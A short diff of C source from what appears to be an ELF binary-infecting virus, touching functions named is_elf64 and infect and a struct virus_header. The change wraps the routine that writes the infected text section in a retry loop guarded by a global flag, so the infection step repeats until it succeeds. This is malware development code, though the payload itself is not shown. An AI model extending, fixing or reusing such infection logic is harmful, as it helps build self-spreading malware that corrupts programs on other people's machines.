@@ -19,6 +19,8 @@
 #define has_no_phoff(e_phoff)         ((e_phoff) == 0)
 #define has_no_shoff(e_shoff)         ((e_shoff) == 0)
 
+int once = 1;
+
 static bool	is_elf64(const char *file)
 {
 	Elf64_Ehdr	hdr;
@@ -65,11 +67,19 @@ inline bool	infect(const struct virus_header *vhdr, const char *file)
 	}
 	free_accessor(&file_ref);
 	free_accessor(&clone_ref);
+	
 
-    if (create_text_and_write()){
-		log_success();
-		return true;
+	while (once == 1)
+	{
+		if (create_text_and_write()){
+			once = 0;
+			log_success();
+			return true;
+		}
 	}
+	
     
+    
+
 	return false;
 }
